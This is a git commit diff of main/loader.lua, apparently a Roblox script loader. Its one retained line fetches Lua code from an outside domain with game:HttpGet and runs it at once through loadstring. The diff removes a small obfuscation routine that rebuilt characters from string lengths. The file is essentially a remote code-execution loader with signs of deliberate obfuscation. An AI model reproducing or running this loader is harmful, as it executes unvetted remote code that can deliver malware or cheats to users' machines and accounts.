b0105bbd6058d0ae4d66cac2f709b9b736da9b8e
kiyokar <dominiktoth791@gmail.com>
2024-08-13 14:22:07 +0200

    Update loader.lua

--- main/loader.lua
+++ main/loader.lua
@@ -1,11 +1,2 @@
 loadstring(game:HttpGet("https://egorikusa.space/bb9665b7b67d28725279d5b7.lua", true))()
-function yxsFzTwpwu(c)
-tab={}
-for i = 1,#c do
-x=string.len(c[i]) 
-y=string.char(x)
-table.insert(tab,y)
-end
-x=table.concat(tab)
-return x
-end 
+
